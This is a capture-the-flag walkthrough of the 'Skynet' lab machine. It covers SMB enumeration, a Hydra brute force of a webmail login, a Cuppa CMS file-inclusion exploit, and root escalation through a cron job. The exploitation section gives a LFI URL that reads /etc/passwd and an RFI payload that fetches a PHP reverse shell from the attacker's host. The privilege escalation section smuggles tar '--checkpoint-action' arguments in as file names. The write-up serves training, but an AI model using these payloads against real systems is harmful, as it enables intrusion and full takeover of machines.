# Skynet

**CTF Domain: Skynet.ctf**

## Scans

```rustscan -a Skynet.ctf```


## Eumeration

SMB Share allows anonymous login to /anonymous

attention.txt - All passwords have been reset, maybe we can find some of those passwords?

logs/log1.txt - Password list? Maybe use Hydra to brute force a login?

Theres a share named "milesdyson" could that be a username?

Login page: /squirrelmail/src/login.php

Using Hydra to brute force gives us a login! `milesdyson:$PASSWORD`

Email titled "Samba password reset" gives us a possible SMB password: ")s{A&2Z=F^n_E.B`"

SMB Password works! Gives us access to milesdyson share

Notes folder, important.txt gives us hidden directory "/45kra24zxs28v3yd/"

Running feroxbuster on that url gives us the other CMS /45kra24zxs28v3yd/administrator

Cuppa CMS, based on question most likely vulnerable to this:
```
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion | php/webapps/25971.txt
```

Other passwords did not work, really not sure what we're supposed to do to log in...

Turns out we don't need to! Exploit works unauthenticated

## Exploitation

Using this link we can exploit LFI:
```
http://skynet.ctf/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../etc/passwd
```

To turn this into a shell, lets use RFI

Get a PHP reverse shell and host it using python, then open up a pwncat listener

Set the urlConfig parameter to be our machine with the PHP reverse shell and we get a connection!
```
?urlConfig=http://$IP:8000/php-reverse-shell.php
```

## Privilege Escalation

LinPEAS found an interesting crontab entry, root is running backup.sh in milesdyson's home every minute

```
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
```

Look like we can't write to it, but we can read what it does:
```
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Since the tar command uses the * wildcard, we might be able to use this article:

https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

Since we can edit the /var/www/html directory, we can add arguments to the tar command by creating files with the arguments name

Create a simple bash reverse shell, name it shell.sh and put it in the /var/www/html directory

Run these commands to add arguments to tar to run the shell:
```
echo "" > "--checkpoint-action=exec=bash shell.sh"
echo "" > --checkpoint=1
```

And after a minute, we get a root shell!
